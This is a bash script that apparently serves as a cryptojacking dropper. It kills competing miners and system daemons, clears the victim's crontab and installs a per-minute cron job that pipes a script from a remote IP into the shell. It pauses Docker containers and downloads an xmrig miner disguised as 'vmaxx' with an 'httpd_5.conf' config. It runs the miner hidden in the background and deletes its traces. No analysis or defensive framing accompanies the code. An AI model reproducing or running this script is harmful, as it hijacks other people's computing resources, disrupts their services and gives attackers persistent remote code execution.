#!/bin/bash
pkill -f atd
pkill -f accounts-daemon
pkill -f 192.99.56.117
pkill -9 192.99.56.117
pkill -f 142.4.124.164
pkill -9 142.4.124.164
pkill -f myatd
pkill -f minergate
pkill -f minergate-cli
pkill -f ./sshd
pkill -f ddg
pkill -f 128.199.86.57
pkill -f mutex
pkill -f mule
pkill -f pubg
pkill -f watch-smart
pkill -f vmaxx
pkill -f ./vmaxx
pkill -f carbon
pkill -f Carbon
pkill -f AnXqV.yam
pkill -f vpp
pkill -f wipefs
pkill -f fs-manager
rm -rf /dev/shm/jboss
pkill -f vpz
pkill -f xmrig
if [ ! "$(ps -fe|grep vmaxx |grep -v grep)" ]; then
	ps auxw|grep -v grep|grep -v nginx|grep "\./"|sort -rn -k3|awk '{if($3>70.0) print $2}'|xargs kill -9
	rm -rf /var/tmp/ysjswirmrm.conf
	rm -rf /var/tmp/sshd
	mkdir /var/tmp
	pkill -9 tratum
	pkill -9 mixnerdx
	pkill -9 performedl
	pkill -9 sleep
	pkill -9 vmaxx
	pkill -9 /tmp/httpd.conf
	pkill -9 JnKihGjn
	pkill -9 irqba2anc1
	pkill -9 irqba5xnc1
	pkill -9 irqbnc1
	pkill -9 ir29xc1
	pkill -9 conns
	pkill -9 irqbalance
	pkill -9 crypto-pool
	pkill -9 XJnRj
	pkill -9 NXLAi
	pkill -9 BI5zj
	pkill -9 askdljlqw
	pkill -9 minerd
	pkill -9 minergate
	pkill -9 Guard.sh
	pkill -9 ysaydh
	pkill -9 bonns
	pkill -9 donns
	pkill -9 kxjd
	pkill -f sleep
	pkill -f /tmp/m
	pkill -f JnKihGjn
	pkill -f irqba2anc1
	pkill -f irqba5xnc1
	pkill -f conns
	pkill -f irqbalance
	pkill -f crypto-pool
	pkill -f XJnRj
	pkill -f NXLAi
	pkill -f BI5zj
	pkill -f askdljlqw
	pkill -f minerd
	pkill -f minergate
	pkill -f Guard.sh
	pkill -f ysaydh
	pkill -f bonns
	pkill -f donns
	pkill -f kxjd
	pkill -f 108.61.186.224
	pkill -f Duck.sh
	pkill -f bonn.sh
	pkill -f conn.sh
	pkill -f kworker34
	pkill -f kw.sh
	pkill -f pro.sh
	pkill -f polkitd
	pkill -f acpid
	pkill -f bb
	pkill -9 atd
	pkill -9 accounts-daemon
	pkill -f yam
	pkill -f vpz
	pkill -f xmrig
	ps auxf|grep -v grep|grep -v ovpvwbvtat|grep -v logo8|grep "/tmp/"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "\./"|grep 'httpd.conf'|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "\-p x"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "cryptonight"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "ysjswirmrm"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "snapd"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "mysql_dump"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "rcp_bh"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "config.json"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "minerd"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "mine.xmr.mypool.online"|awk '{print $2}'|xargs kill -9
	crontab -r || true && \
	echo "* * * * * wget -q http://93.174.93.149/logo8.sh -O - | sh" >> /tmp/cron || true && \
	crontab /tmp/cron || true && \
	rm -rf /tmp/cron || true && \
	docker pause `docker ps|grep kube-apis |awk '{print $1}'`
	docker pause `docker ps|grep nginx78 |awk '{print $1}'`
fi

if [ ! "$(ps -fe|grep vmaxx |grep -v grep)" ]; then
	if [ `getconf LONG_BIT` = "64" ]
		then
		wget -O /tmp/vmaxx http://198.50.179.109:8020/xmrig_64
	else
		wget -O /tmp/vmaxx http://198.50.179.109:8020/xmrig_32
	fi

	chmod +x /tmp/vmaxx
	wget -O /tmp/httpd_5.conf http://198.50.179.109:8020/httpd_5.conf
	nohup /tmp/vmaxx  -c /tmp/httpd_5.conf>/dev/null 2>&1 &
	sleep 5
	rm -rf /tmp/httpd_5.conf
	rm -f /tmp/vmaxx
	rm -rf /tmp/logo8.sh
fi

echo "runing....."
sleep 60
exit
